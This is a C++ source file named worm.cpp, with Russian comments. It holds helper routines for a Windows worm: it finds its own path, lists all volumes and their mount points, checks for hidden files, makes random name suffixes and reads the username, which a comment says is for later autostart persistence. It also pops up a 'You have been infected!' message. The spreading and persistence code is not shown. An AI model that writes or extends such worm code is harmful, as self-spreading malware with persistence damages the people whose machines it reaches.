// worm.cpp
#include "worm.h"
#include <windows.h>

std::wstring get_own_path() {
    wchar_t buffer[MAX_PATH];
    DWORD result = GetModuleFileNameW(NULL, buffer, MAX_PATH);
    if (result == 0 || result == MAX_PATH) {
        return L"";
    }
    return std::wstring(buffer);
}

std::wstring get_drive_root_from_path(const std::wstring& full_path) {
    if (full_path.size() < 3 || full_path[1] != L':' || full_path[2] != L'\\') {
        return L"";
    }
    return full_path.substr(0, 3);  // Например: "C:\"
}

bool is_hidden(const fs::path& path) {
    DWORD attrs = GetFileAttributesW(path.wstring().c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        return false; // Если не удалось получить атрибуты, считаем что не скрыта
    }
    return (attrs & FILE_ATTRIBUTE_HIDDEN) || (attrs & FILE_ATTRIBUTE_SYSTEM);
}


std::string generate_random_suffix() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(1000, 9999);
    return std::to_string(dis(gen));
}

// Генератор временной метки
std::string get_timestamp() {
    auto now = std::chrono::system_clock::now();
    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
        now.time_since_epoch()).count() % 10000;
    return std::to_string(ms);
}

void init_locale() {
#ifdef _WIN32
    SetConsoleOutputCP(CP_UTF8);
    std::wcout.imbue(std::locale(".UTF-8"));
    std::wcerr.imbue(std::locale(".UTF-8"));
#endif
}

std::wstring get_filename_stem(const fs::path& filepath) {
    try {
        return filepath.stem().wstring();
    }
    catch (...) {
        // Если не удалось получить имя, возвращаем пустую строку
        return L"file";
    }
}


void worm_was_started() {
    MessageBoxW(
        NULL,                            // Владелец окна (NULL — нет владельца)
        L"Ты был заражён!",              // Текст сообщения
        L"Предупреждение",               // Заголовок окна
        MB_OK | MB_ICONWARNING           // Кнопка OK и значок предупреждения
    );
}


vector<wstring> get_all_volumes() { // находим все корневые директории
    vector<wstring> volumes;

    wchar_t volumeName[MAX_PATH] = { 0 };
    HANDLE hFind = FindFirstVolumeW(volumeName, ARRAYSIZE(volumeName));

    if (hFind == INVALID_HANDLE_VALUE) {
        wcerr << L"Ошибка при вызове FindFirstVolumeW\n";
        return volumes;
    }

    do {
        volumes.push_back(volumeName);
    } while (FindNextVolumeW(hFind, volumeName, ARRAYSIZE(volumeName)));

    FindVolumeClose(hFind);
    return volumes;
}


vector<wstring> get_paths_for_volume(const wstring& volumeName) { // преобразуем в wstring найденные дирректории
    vector<wstring> paths;

    DWORD returnLength = 0;
    wchar_t buffer[MAX_PATH * 10] = { 0 };

    if (GetVolumePathNamesForVolumeNameW(volumeName.c_str(), buffer, ARRAYSIZE(buffer), &returnLength)) {
        wchar_t* current = buffer;
        while (*current) {
            paths.push_back(current);
            current += wcslen(current) + 1;
        }
    }
    else {
        wcerr << L"Невозможно получить путь для тома: " << volumeName << L"\n";
    }

    return paths;
}

wstring get_username() { // получаем юсер нейм пользователя для добавления в автозагрузку в дальнейшем
    wchar_t username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserNameW(username, &size);
    return std::wstring(username);
}